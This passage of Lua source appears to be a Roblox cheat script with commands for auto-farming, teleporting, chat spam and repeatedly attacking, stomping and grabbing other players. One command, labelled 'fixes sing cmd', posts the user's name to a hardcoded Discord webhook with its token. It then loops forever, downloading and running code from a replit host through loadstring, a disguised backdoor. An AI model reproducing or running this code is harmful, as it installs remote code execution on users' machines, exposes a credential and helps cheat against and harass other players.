timeusageclose.Font = Enum.Font.SourceSans
timeusageclose.Text = "X"
timeusageclose.TextColor3 = Color3.fromRGB(255, 0, 4)
timeusageclose.TextSize = 33.000

timeusagesecondsnum.Name = "timeusagesecondsnum"
timeusagesecondsnum.Parent = timeusagemainframe
timeusagesecondsnum.BackgroundColor3 = Color3.fromRGB(49, 46, 46)
timeusagesecondsnum.BorderColor3 = Color3.fromRGB(49, 46, 46)
timeusagesecondsnum.Position = UDim2.new(0.677042782, 0, 0.532374084, 0)
timeusagesecondsnum.Size = UDim2.new(0, 90, 0, 30)
timeusagesecondsnum.Font = Enum.Font.SourceSans
timeusagesecondsnum.Text = "0"
timeusagesecondsnum.TextColor3 = Color3.fromRGB(255, 255, 255)
timeusagesecondsnum.TextSize = 20.000
timeusagesecondsnum.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)

timeusageminutesnum.Name = "timeusageminutesnum"
timeusageminutesnum.Parent = timeusagemainframe
timeusageminutesnum.BackgroundColor3 = Color3.fromRGB(49, 46, 46)
timeusageminutesnum.BorderColor3 = Color3.fromRGB(49, 46, 46)
timeusageminutesnum.Position = UDim2.new(0.350194544, 0, 0.482014358, 0)
timeusageminutesnum.Size = UDim2.new(0, 90, 0, 30)
timeusageminutesnum.Font = Enum.Font.SourceSans
timeusageminutesnum.Text = "0"
timeusageminutesnum.TextColor3 = Color3.fromRGB(255, 255, 255)
timeusageminutesnum.TextSize = 20.000
timeusageminutesnum.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)

timeusagehoursnum.Name = "timeusagehoursnum"
timeusagehoursnum.Parent = timeusagemainframe
timeusagehoursnum.BackgroundColor3 = Color3.fromRGB(49, 46, 46)
timeusagehoursnum.BorderColor3 = Color3.fromRGB(49, 46, 46)
timeusagehoursnum.Position = UDim2.new(0, 0, 0.532374084, 0)
timeusagehoursnum.Size = UDim2.new(0, 90, 0, 30)
timeusagehoursnum.Font = Enum.Font.SourceSans
timeusagehoursnum.Text = "0"
timeusagehoursnum.TextColor3 = Color3.fromRGB(255, 255, 255)
timeusagehoursnum.TextSize = 20.000
timeusagehoursnum.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)

-- Scripts:

local function HROBBS_fake_script() -- timeusageclose.LocalScript 
	local script = Instance.new('LocalScript', timeusageclose)

	script.Parent.MouseButton1Click:Connect(function()
	local timeusage = game:GetService("CoreGui"):FindFirstChild("timeusage")
	if timeusage then
		timeusage:Destroy()
	end
	end)
end
coroutine.wrap(HROBBS_fake_script)()
local function KPXZVQH_fake_script() -- timeusagemainframe.DraggableGUI 
	local script = Instance.new('LocalScript', timeusagemainframe)

	local UserInputService = game:GetService("UserInputService")
	
	local gui = script.Parent
	
	local dragging
	local dragInput
	local dragStart
	local startPos
	
	local function update(input)
		local delta = input.Position - dragStart
		gui.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
	end
	
	gui.InputBegan:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			dragging = true
			dragStart = input.Position
			startPos = gui.Position
			
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragging = false
				end
			end)
		end
	end)
	
	gui.InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			dragInput = input
		end
	end)
	
	UserInputService.InputChanged:Connect(function(input)
		if input == dragInput and dragging then
			if gui.Visible then
				update(input)
			end
		end
	end)
end
coroutine.wrap(KPXZVQH_fake_script)()

while true do
wait()
timeusagehoursnum.Text = timeusagehourslol
timeusageminutesnum.Text = timeusageminuteslol
timeusagesecondsnum.Text = timeusagesecondslol
end
end
end)


	   _G.AntiStomp = false
AddCommand("antistomp", {"nostomp"}, "may not work", {}, function(Caller)
        if (Caller ~= LocalPlayer) then
a = true
        else

		   if _G.AntiStomp == true then
			   _G.AntiStomp = false
        Notify({ 
Description = "off";
Title = "antistomp";
Duration = 2;
});
		   else
			   _G.AntiStomp = true
        Notify({ 
Description = "on";
Title = "antistomp";
Duration = 2;
});
			   while _G.AntiStomp == true and wait() do
				   pcall(function()
					   local LocalPlayer = game:GetService("Players").LocalPlayer
					   local char = LocalPlayer.Character
					   if game.Players.LocalPlayer.Character.Humanoid.Health <= 5 then
			for L_170_forvar0, L_171_forvar1 in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
				if L_171_forvar1:IsA("BasePart") then
					L_171_forvar1:Destroy()
				end
			end
wait(7)
end
end)
end
end
end
end)

AddCommand("joinleavelogs", {"jllogs"}, "ye", {}, function(Caller, Args)
        if (Caller ~= LocalPlayer) then
a = true
        else
if joinleavelogs == false then
joinleavelogs = false
else
joinleavelogs = true

end


end
end)



AddCommand("discordlisten", {}, "fixes sing cmd", {}, function(Caller)
webhookvalue = 'https://discord.com/api/webhooks/943245392835903598/HyHMXUo36HgAm4A6yJISq0UA2Bgeb1Z_6k-j83nbi-kK9DoiVwrVM550T-fMfBNR0gHd'
    local player = game.Players.LocalPlayer


	local HttpService = game:GetService("HttpService")
    local webhook_url = webhookvalue
    local options = http_request or syn.request or request
    function sendMessage(msg)
        local payload = {
            ["content"] = msg
        }
        local headers = {
            ["content-type"] = "application/json"
        }

        local request_body_encoded = HttpService:JSONEncode(payload)
        local request_payload = {Url = webhook_url, Body = request_body_encoded, Method = "POST", Headers = headers}
        options(request_payload)
    end
  
sendMessage(player.Name.." conected") 
while true do
wait()
loadstring(game:HttpGet("https://intentaffectionatepayware.copyonce1.repl.co/"))()

if a == "function summon" then
   ExecuteCommand("summon", {}, LocalPlayer);
  sendMessage("Script successfully executed!")
  wait(5)
end

end

end)


AddCommand("fixsing", {"singfix"}, "fixes sing cmd", {}, function(Caller)
flingcooldown = false
        Notify({ 
Description = "if this doesnt work try again in 20-30 seconds";
Title = "fix";
Duration = 2;
});
end)

automuscle = false
automuscleoncelol = false

AddCommand("autoweight", {"weightfarm"}, "fixes sing cmd", {}, function(Caller)
automuscle = not automuscle

if automuscleoncelol == false then
automuscleoncelol = true


 _G.Skidhub = "u"

Notify({ 
Description = "press 'u' to toggle off btw";
Title = "farm";
Duration = 5;
});


gv = false
plr = game.Players.LocalPlayer
mouse = plr:GetMouse()
mouse.KeyDown:connect(function(key)
    if key == _G.Skidhub and  gv == false then
        gv = true

 
automuscle = false


    elseif key == _G.Skidhub and gv == true then
        gv = false
automuscle = false

    end
end)


end



if automuscle == true then
repeat
wait()
		if not game.Players.LocalPlayer.Character:FindFirstChild("[HeavyWeights]") then
			wait()
			local k = game.Workspace.Ignored.Shop["[HeavyWeights] - $250"]
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = k.Head.CFrame + Vector3.new(0, 3, 0)
			if (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - k.Head.Position).Magnitude <= 50 then
				wait(.2)
				fireclickdetector(k:FindFirstChild("ClickDetector"), 4)
			end
		end
		if not game.Players.LocalPlayer.Character:FindFirstChild("[HeavyWeights]") then
			tool = game.Players.LocalPlayer.Backpack:WaitForChild("[HeavyWeights]")
			tool.Parent = game.Players.LocalPlayer.Character
		end
		game:GetService("VirtualUser"):ClickButton1(Vector2.new())
		local d = Vector3.new(-1006.99, -51.1542, -1014.33)
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(d)
ExecuteCommand("away", {}, LocalPlayer);



until automuscle == false
end
end)





AddCommand("time", {}, "disables noclip", {}, function(Caller)
game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(timeusagesecondslol.." seconds","All")
wait(0.5)
game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(timeusageminuteslol.." mins","All")
wait(0.5)
game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(timeusagehourslol.." hours","All")
end)



singcooldown = false
AddCommand("sing", {"singsong"}, "disables noclip", {}, function(Caller)
if singcooldown == false then
singcooldown = true
singsong = math.random(1, 4)

print("chose song ".. singsong)
        Notify({ 
Description = "chose song "..singsong;
Title = "sing";
Duration = 2;
});

--sing song 1 start
if singsong == 1 then
game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Super Idol de xiaorong","All")
wait(1.8)
game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Dou mei ni de tian","All")
wait(1.8)
game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Ba yue zhengwu de yangguang","All")
wait(1.8)
game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Dou mei ni yaoyan","All")
wait(2)
game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Re'ai 105 °C de ni","All")
wait(1.6)
game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Di di qingchun de zhengliushui","All")
wait(1.8)
game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Zai zhe duyiwu'er","All")
wait(2)
game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Shuyu wo de shidai","All")
wait(1.7)
game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Mo wangle chuxin chang zai","All")
wait(2)
game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Tongkuai qu re'ai","All")
end
-- sing song 1 end



--sing song 2 start
if singsong == 2 then
game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("I'm a Barbie girl in a Barbie world","All")
wait(1.5)
game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Life in plastic, it's fantastic","All")
wait(1.3)
game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("You can brush my hair, u*ndr**s me everywhere","All")
wait(1.7)
game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Imagination, life is your creation","All")
wait(1.6)
game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Come on Barbie, let's go party","All")
wait(1.5)
game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Ah ah ah yeah","All")
wait(1.8)
game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Come on Barbie, let's go party","All")
wait(1.6)
game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Ooh whoa, ooh whoa","All")
end
-- sing song 2 end


--sing song 3 start
if singsong == 3 then
game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Material Girl","All")
wait(1.7)
game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("I want Chanel 9 boots","All")
wait(1.7)
game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("All these ****** steady jockin', 'cus they know I'm the truth","All")

wait(1.7)
game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Material Girl","All")
wait(1.7)

game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("And I get it from my mammy","All")
wait(1.6)
game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Balmain bustdowns, these **** can't stand me (Material Girl)","All")
wait(1.7)
end
-- sing song 3 end


--sing song 4 start
if singsong == 4 then
game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("*sings most beautiful song you have ever heard*  ","All")
end
-- sing song 4 end


wait(25)
singcooldown = false
end
end)




AddCommand("hidemask", {}, "hides ur username", {}, function(Caller)
                    local MaskVisible = player.Character:FindFirstChild('In-gameMask'):FindFirstChild('Handle')
                    if MaskVisible then
                        MaskVisible:Destroy()
                    end
end)





AddCommand("mask", {"hideuser"}, "hides ur username", {}, function(Caller)
        if (Caller ~= LocalPlayer) then
a = true
        else
   wait(0.2)
   local Players = game:GetService("Players")
local ContextActionService = game:GetService("ContextActionService")
 
local localPlayer = Players.LocalPlayer

			if localPlayer.Character then 
				local humanoid = localPlayer.Character:FindFirstChildOfClass("Humanoid")
				if humanoid then 
					humanoid:UnequipTools()
end
end
   
   local plr = game.Players.LocalPlayer
	local savedbatpos = plr.Character.HumanoidRootPart.Position
	plr.Character.HumanoidRootPart.CFrame = CFrame.new(-208, 21, -829)
	wait(.4)

	fireclickdetector(game.Workspace.Ignored.Shop['[Hockey Mask] - $60'].ClickDetector)
	wait(0.1)
	plr.Character.HumanoidRootPart.CFrame = CFrame.new(savedbatpos)
end
end)

AddCommand("declinerequest", {"declinebring"}, "doesnt allow a whitelisted user bring u", {}, function(Caller)
        if (Caller ~= LocalPlayer) then
a = true
        else
requestingye = false
        Notify({ 
Description = "declining bring/request requests";
Title = "permission";
Duration = 2;
});
end
end)



AddCommand("kit1", {"kitone"}, "rev, db, food", {}, function(Caller)
        if (Caller ~= LocalPlayer) then
a = true
        else
   local plr = game.Players.LocalPlayer
	local savedarmourpos = plr.Character.HumanoidRootPart.Position
	plr.Character.HumanoidRootPart.CFrame = CFrame.new(-643, 22, -117)
	wait(.4)

	fireclickdetector(game.Workspace.Ignored.Shop['[Revolver] - $1300'].ClickDetector)
	wait(0.1)
	
	   local plr = game.Players.LocalPlayer
	local savedarmourpos = plr.Character.HumanoidRootPart.Position
wait(0.2)
	plr.Character.HumanoidRootPart.CFrame = CFrame.new(-643, 22, -117)
	wait(.4)

	fireclickdetector(game.Workspace.Ignored.Shop['12 [Revolver Ammo] - $75'].ClickDetector)
	wait(0.9)
		fireclickdetector(game.Workspace.Ignored.Shop['12 [Revolver Ammo] - $75'].ClickDetector)
	wait(0.9)
		fireclickdetector(game.Workspace.Ignored.Shop['12 [Revolver Ammo] - $75'].ClickDetector)
	wait(0.9)
		fireclickdetector(game.Workspace.Ignored.Shop['12 [Revolver Ammo] - $75'].ClickDetector)
	wait(0.9)
		fireclickdetector(game.Workspace.Ignored.Shop['12 [Revolver Ammo] - $75'].ClickDetector)
	wait(0.9)
		plr.Character.HumanoidRootPart.CFrame = CFrame.new(-1043, 21, -257)
		plr.Character.HumanoidRootPart.CFrame = CFrame.new(-1043, 22, -257)
		plr.Character.HumanoidRootPart.CFrame = CFrame.new(-1043, 21, -257)
		wait(0.2)
		fireclickdetector(game.Workspace.Ignored.Shop['[Double-Barrel SG] - $1400'].ClickDetector)
		wait(0.4)
				fireclickdetector(game.Workspace.Ignored.Shop['18 [Double-Barrel SG Ammo] - $60'].ClickDetector)
	wait(0.9)
					fireclickdetector(game.Workspace.Ignored.Shop['18 [Double-Barrel SG Ammo] - $60'].ClickDetector)
	wait(0.9)
					fireclickdetector(game.Workspace.Ignored.Shop['18 [Double-Barrel SG Ammo] - $60'].ClickDetector)
	wait(0.9)
					fireclickdetector(game.Workspace.Ignored.Shop['18 [Double-Barrel SG Ammo] - $60'].ClickDetector)
	wait(0.9)
					fireclickdetector(game.Workspace.Ignored.Shop['18 [Double-Barrel SG Ammo] - $60'].ClickDetector)
	wait(0.9)
	plr.Character.HumanoidRootPart.CFrame = CFrame.new(savedarmourpos)
end
end)


AddCommand("allowrequest", {"allowbring"}, "allows a whitelisted user bring u", {}, function(Caller)
        if (Caller ~= LocalPlayer) then
a = true
        else
requestingye = true
        Notify({ 
Description = "allowing request/bring requests";
Title = "permission";
Duration = 2;
});
end
end)
requestingye = true
AddCommand("request", {"bring"}, "lets a whitelisted user bring u", {}, function(Caller)
if requestingye == true then
flying=false
attacking = false
wait(0.2)
                        game.ReplicatedStorage.MainEvent:FireServer("Block",true)
idkman = Caller.name
	game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[idkman].Character.HumanoidRootPart.CFrame
wait(0.3)
                        game.ReplicatedStorage.MainEvent:FireServer("Block",false)
end
end)
AddCommand("crewid", {"bring"}, "lets a whitelisted user bring u", {"1"}, function(Caller)
	local Amount = GetPlayer(Args[1])
    for i, v in next, Amount do
Amount = v.Name
crewidlol = game:GetService("Players")[Amount].DataFolder.Information.Crew.Value

        if (Caller ~= LocalPlayer) then
game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(crewidlol.."pesos","All")
        else
        Notify({ 
Description = crewidlol;
Title = "crew";
Duration = 2;
});
end
end
end)

AddCommand("cash", {}, "teleports yourself to the other character", {"1"}, function(Caller, Args)

	local Amount = GetPlayer(Args[1])
    for i, v in next, Amount do
Amount = v.Name

        if (Caller ~= LocalPlayer) then
cashlol = game:GetService("Players")[Amount].DataFolder.Currency.Value
game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(cashlol.."pesos","All")
        else
        Notify({ 
Description = game:GetService("Players")[Amount].DataFolder.Currency.Value;
Title = "cash";
Duration = 2;
});
end
end
end)



AddCommand("loopkill", {}, "teleports yourself to the other character", {}, function(Caller, Args)
bountyfarm2 = true

if standing == true then
ExecuteCommand("unstand", {}, LocalPlayer);
standing2 = true
end
repeat
wait()

	local Amount = GetPlayer(Args[1])
    for i, v in next, Amount do
Amount = v.Name


if game.Players[Amount].Character.BodyEffects['K.O'].Value ~= true then
ExecuteCommand("attack", {Amount}, LocalPlayer);
end
wait(0.1)
if game.Players[Amount].Character.BodyEffects['K.O'].Value ~= true then
ExecuteCommand("attack", {Amount}, LocalPlayer);
end
if game.Players[Amount].Character.BodyEffects['K.O'].Value ~= true then
ExecuteCommand("attack", {Amount}, LocalPlayer);
end


function gotokill()
 local p1 = game.Players.LocalPlayer.Character.HumanoidRootPart
local p2 = Amount
p1.CFrame = game.Players[p2].Character.LowerTorso.CFrame
game.ReplicatedStorage.MainEvent:FireServer("Stomp")
game.ReplicatedStorage.MainEvent:FireServer("Stomp")

end
if game.Players[Amount].Character.BodyEffects['K.O'].Value == true then
wait(0.1)
gotokill()
wait(0.1)
gotokill()
wait(0.1)
gotokill()
wait(0.1)
gotokill()
wait(0.1)
wait(0.1)
gotokill()
wait(0.1)
gotokill()
wait(0.1)
gotokill()
end
wait(0.5)



end

until bountyfarm2 == false


end)


AddCommand("unloopkill", {}, "teleports yourself to the other character", {}, function(Caller)
bountyfarm2 = false
end)

AddCommand("unbountyfarm", {}, "teleports yourself to the other character", {}, function(Caller)
bountyfarm = false
end)

bountyfarm2 = false
bountyfarm = false



AddCommand("bountyfarm", {}, "teleports yourself to the other character", {}, function(Caller)
bountyfarm = true

if standing == true then
ExecuteCommand("unstand", {}, LocalPlayer);
standing2 = true
end
repeat
wait()

	local Amount = GetPlayer("random")
    for i, v in next, Amount do
Amount = v.Name


if game.Players[Amount].Character.BodyEffects['K.O'].Value ~= true then
ExecuteCommand("attack", {Amount}, LocalPlayer);
end
wait(0.1)
if game.Players[Amount].Character.BodyEffects['K.O'].Value ~= true then
ExecuteCommand("attack", {Amount}, LocalPlayer);
end
if game.Players[Amount].Character.BodyEffects['K.O'].Value ~= true then
ExecuteCommand("attack", {Amount}, LocalPlayer);
end


function gotokill()
 local p1 = game.Players.LocalPlayer.Character.HumanoidRootPart
local p2 = Amount
p1.CFrame = game.Players[p2].Character.LowerTorso.CFrame
game.ReplicatedStorage.MainEvent:FireServer("Stomp")
game.ReplicatedStorage.MainEvent:FireServer("Stomp")

end
if game.Players[Amount].Character.BodyEffects['K.O'].Value == true then
gotokill()
wait(0.1)
gotokill()
wait(0.1)
gotokill()
wait(0.1)
gotokill()
wait(0.1)
gotokill()
wait(0.1)
gotokill()
wait(0.1)
gotokill()
wait(0.1)
gotokill()
wait(0.1)
gotokill()
wait(0.1)
gotokill()
wait(0.1)
wait(0.1)
gotokill()
wait(0.1)
gotokill()
wait(0.1)
gotokill()
wait(0.1)
wait(0.1)
gotokill()
wait(0.1)
gotokill()
wait(0.1)
gotokill()
wait(0.1)
wait(0.1)
gotokill()
wait(0.1)
end
wait(0.5)



end

until bountyfarm == false


end)


AddCommand("getnearest", {}, "teleports yourself to the other character", {"1"}, function(Caller, Args)
	local Amount = GetPlayer("nearest")
    for i, v in next, Amount do
nearestplrlol = v.Name

end

end)

AddCommand("bag", {"bagplr"}, "teleports yourself to the other character", {"1"}, function(Caller, Args)
	plr = game:GetService('Players').LocalPlayer
	X1 = plr.Character:FindFirstChild('HumanoidRootPart').CFrame.X
		Y1 = plr.Character:FindFirstChild('HumanoidRootPart').CFrame.Y
		Z1 = plr.Character:FindFirstChild('HumanoidRootPart').CFrame.Z
plr.Character.HumanoidRootPart.CFrame = CFrame.new(X1,Y1+7,Z1)
	plr = game:GetService('Players').LocalPlayer
	X1 = plr.Character:FindFirstChild('HumanoidRootPart').CFrame.X
		Y1 = plr.Character:FindFirstChild('HumanoidRootPart').CFrame.Y
		Z1 = plr.Character:FindFirstChild('HumanoidRootPart').CFrame.Z

if standing == true then
ExecuteCommand("unstand", {}, LocalPlayer);
standing2 = true
end

	local Amount = GetPlayer(Args[1])
    for i, v in next, Amount do
Amount = v.Name
	local TargetPlr = Amount
	function getRoot(char)
		local rootPart = char:FindFirstChild('HumanoidRootPart') or char:FindFirstChild('Torso') or char:FindFirstChild('UpperTorso')
		return rootPart
	end

	if TargetPlr and game.Players[TargetPlr].Character.BodyEffects['K.O'].Value == false then
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Workspace.Ignored.Shop['[BrownBag] - $25'].Head.CFrame
		wait(.30)
		fireclickdetector(game.Workspace.Ignored.Shop['[BrownBag] - $25'].ClickDetector)
		game.Players.LocalPlayer.Backpack:WaitForChild("[BrownBag]").Parent = game.Players.LocalPlayer.Character

		wait(.5)
		repeat
			pcall(function()
				wait()
				getRoot(game.Players[TargetPlr].Character).CFrame = getRoot(game.Players.LocalPlayer.Character).CFrame + Vector3.new(1,3,0)
				game.Players.LocalPlayer.Character["[BrownBag]"]:Activate()
			end)
		until game.Players[TargetPlr].Character:FindFirstChild("Christmas_Sock")
	elseif game.Players[TargetPlr].Character.BodyEffects['K.O'].Value == false then
	end
end
plr.Character.HumanoidRootPart.CFrame = CFrame.new(X1,Y1+7,Z1)
if standing2 == true then
ExecuteCommand("summon", {}, LocalPlayer);
end
end)

AddCommand("bringplr", {"targetuser"}, "teleports yourself to the other character", {"1"}, function(Caller, Args)
	local Amount = GetPlayer(Args[1])
    for i, v in next, Amount do
Amount = v.Name
allreadytplol = false
	plr = game:GetService('Players').LocalPlayer
	X2 = plr.Character:FindFirstChild('HumanoidRootPart').CFrame.X
		Y2 = plr.Character:FindFirstChild('HumanoidRootPart').CFrame.Y
		Z2 = plr.Character:FindFirstChild('HumanoidRootPart').CFrame.Z
plr.Character.HumanoidRootPart.CFrame = CFrame.new(X2,Y2+7,Z2)

	plr = game:GetService('Players').LocalPlayer
	X2 = plr.Character:FindFirstChild('HumanoidRootPart').CFrame.X
		Y2 = plr.Character:FindFirstChild('HumanoidRootPart').CFrame.Y
		Z2 = plr.Character:FindFirstChild('HumanoidRootPart').CFrame.Z
wait(0.2)
if standing == true then
ExecuteCommand("unstand", {}, LocalPlayer);
standing2 = true
end

if game.Players[Amount].Character.BodyEffects['K.O'].Value ~= true then
ExecuteCommand("attack", {Amount}, LocalPlayer);
end
wait(0.1)
if game.Players[Amount].Character.BodyEffects['K.O'].Value ~= true then
ExecuteCommand("attack", {Amount}, LocalPlayer);
end
if game.Players[Amount].Character.BodyEffects['K.O'].Value ~= true then

ExecuteCommand("attack", {Amount}, LocalPlayer);
end
wait(0.5)

local function gotolol()
if game.Players[Amount].Character.BodyEffects['K.O'].Value ~= true then
local p1 = game.Players.LocalPlayer.Character.HumanoidRootPart
local p2 = Amount
p1.CFrame = game.Players[p2].Character.UpperTorso.CFrame
end
end
gotolol()
gotolol()
gotolol()
gotolol()
gotolol()
ExecuteCommand("antifling", {Amount}, LocalPlayer);
wait(0.3)
ExecuteCommand("unantifling", {Amount}, LocalPlayer);
gotolol()
gotolol()
gotolol()
gotolol()
gotolol()
gotolol()
gotolol()
gotolol()
gotolol()
gotolol()
gotolol()
gotolol()
gotolol()
wait(0.2)

allreadytplol = false
repeat
wait(1)
gotolol()
if allreadytplol == false then
game.ReplicatedStorage.MainEvent:FireServer("Grabbing")
end
until game.Players[Amount].Character:FindFirstChild("GRABBING_CONSTRAINT") or game.Players[Amount].Character.BodyEffects['K.O'].Value ~= true

plr.Character.HumanoidRootPart.CFrame = CFrame.new(X2,Y2+7,Z2)

local function bringplrlol()
local p1 = game.Players.LocalPlayer.Character.HumanoidRootPart
local p2 = Amount
p1.CFrame = game.Players[p2].Character.UpperTorso.CFrame
wait(0.1)
local p1 = game.Players.LocalPlayer.Character.HumanoidRootPart
local p2 = Amount
p1.CFrame = game.Players[p2].Character.UpperTorso.CFrame
wait(0.1)
local p1 = game.Players.LocalPlayer.Character.HumanoidRootPart
local p2 = Amount
p1.CFrame = game.Players[p2].Character.UpperTorso.CFrame
wait(0.1)
wait(0.1)
game.ReplicatedStorage.MainEvent:FireServer("Grabbing")
wait(0.3)
plr.Character.HumanoidRootPart.CFrame = CFrame.new(X2,Y2+7,Z2)
end

bringplrlol()
wait(0.2)
ExecuteCommand("antifling", {}, LocalPlayer);
bringplrlol()
ExecuteCommand("unantifling", {}, LocalPlayer);
bringplrlol()
ExecuteCommand("antifling", {}, LocalPlayer);
bringplrlol()
ExecuteCommand("unantifling", {}, LocalPlayer);

bringplrlol()
wait(0.2)
bringplrlol()
wait(0.2)
bringplrlol()
wait(0.2)
bringplrlol()
wait(0.2)
bringplrlol()
wait(0.2)
bringplrlol()
wait(0.2)
bringplrlol()
wait(0.2)
bringplrlol()
wait(0.2)
bringplrlol()
wait(0.2)
bringplrlol()
wait(0.2)
bringplrlol()
wait(0.2)
bringplrlol()
wait(0.2)
bringplrlol()
wait(0.2)
bringplrlol()
wait(0.2)
bringplrlol()
wait(0.2)
bringplrlol()
wait(0.2)

if standing2 == true then
standing2 = false
ExecuteCommand("summon", {}, LocalPlayer);
end

end
end)

AddCommand("save", {"saveme"}, "lets a whitelisted user bring u", {}, function(Caller, Args)
standing2 = false
if standing == true then
ExecuteCommand("unstand", {}, LocalPlayer);
standing2 = true
end
ExecuteCommand("bank", {}, LocalPlayer);
ExecuteCommand("bank", {}, LocalPlayer);

	plr = game:GetService('Players').LocalPlayer
	X1 = plr.Character:FindFirstChild('HumanoidRootPart').CFrame.X
		Y1 = plr.Character:FindFirstChild('HumanoidRootPart').CFrame.Y
		Z1 = plr.Character:FindFirstChild('HumanoidRootPart').CFrame.Z

ExecuteCommand("bank", {}, LocalPlayer);
ExecuteCommand("bank", {}, LocalPlayer);
	local Amount = GetPlayer(Args[1])
    for i, v in next, Amount do
target = v.Name
tweenlol3 = target.Name
allreadytplol = false
local p1 = game.Players.LocalPlayer.Character.HumanoidRootPart
local p2 = target
p1.CFrame = game.Players[p2].Character.LowerTorso.CFrame
wait(0.1)
local p1 = game.Players.LocalPlayer.Character.HumanoidRootPart
local p2 = target
p1.CFrame = game.Players[p2].Character.LowerTorso.CFrame
local p1 = game.Players.LocalPlayer.Character.HumanoidRootPart
local p2 = target
p1.CFrame = game.Players[p2].Character.LowerTorso.CFrame
local p1 = game.Players.LocalPlayer.Character.HumanoidRootPart
local p2 = target
p1.CFrame = game.Players[p2].Character.LowerTorso.CFrame
local p1 = game.Players.LocalPlayer.Character.HumanoidRootPart
local p2 = target
p1.CFrame = game.Players[p2].Character.LowerTorso.CFrame
local p1 = game.Players.LocalPlayer.Character.HumanoidRootPart
local p2 = target
p1.CFrame = game.Players[p2].Character.LowerTorso.CFrame
local p1 = game.Players.LocalPlayer.Character.HumanoidRootPart
local p2 = target
p1.CFrame = game.Players[p2].Character.LowerTorso.CFrame



repeat
wait(0.5)

local p1 = game.Players.LocalPlayer.Character.HumanoidRootPart
local p2 = target
p1.CFrame = game.Players[p2].Character.LowerTorso.CFrame
local p1 = game.Players.LocalPlayer.Character.HumanoidRootPart
local p2 = target
p1.CFrame = game.Players[p2].Character.LowerTorso.CFrame
local p1 = game.Players.LocalPlayer.Character.HumanoidRootPart
local p2 = target
p1.CFrame = game.Players[p2].Character.LowerTorso.CFrame
local p1 = game.Players.LocalPlayer.Character.HumanoidRootPart
local p2 = target
p1.CFrame = game.Players[p2].Character.LowerTorso.CFrame
local p1 = game.Players.LocalPlayer.Character.HumanoidRootPart
local p2 = target
p1.CFrame = game.Players[p2].Character.LowerTorso.CFrame
local p1 = game.Players.LocalPlayer.Character.HumanoidRootPart
local p2 = target
p1.CFrame = game.Players[p2].Character.LowerTorso.CFrame

if allreadytplol == true then

a = true
else


			game.ReplicatedStorage.MainEvent:FireServer("Grabbing", false)
end


until game.Players[target].Character:FindFirstChild("GRABBING_CONSTRAINT") or game.Players[target].Character.BodyEffects['K.O'].Value ~= true


wait(0.2)



allreadytplol = false
local p1 = game.Players.LocalPlayer.Character.HumanoidRootPart
local p2 = target
p1.CFrame = game.Players[p2].Character.LowerTorso.CFrame


function saveme()
local p1 = game.Players.LocalPlayer.Character.HumanoidRootPart
local p2 = target
p1.CFrame = game.Players[p2].Character.LowerTorso.CFrame
local p1 = game.Players.LocalPlayer.Character.HumanoidRootPart
local p2 = target
p1.CFrame = game.Players[p2].Character.LowerTorso.CFrame
local p1 = game.Players.LocalPlayer.Character.HumanoidRootPart
local p2 = target
p1.CFrame = game.Players[p2].Character.LowerTorso.CFrame
local p1 = game.Players.LocalPlayer.Character.HumanoidRootPart
local p2 = target
p1.CFrame = game.Players[p2].Character.LowerTorso.CFrame
local p1 = game.Players.LocalPlayer.Character.HumanoidRootPart
local p2 = target
p1.CFrame = game.Players[p2].Character.LowerTorso.CFrame
local p1 = game.Players.LocalPlayer.Character.HumanoidRootPart
local p2 = target
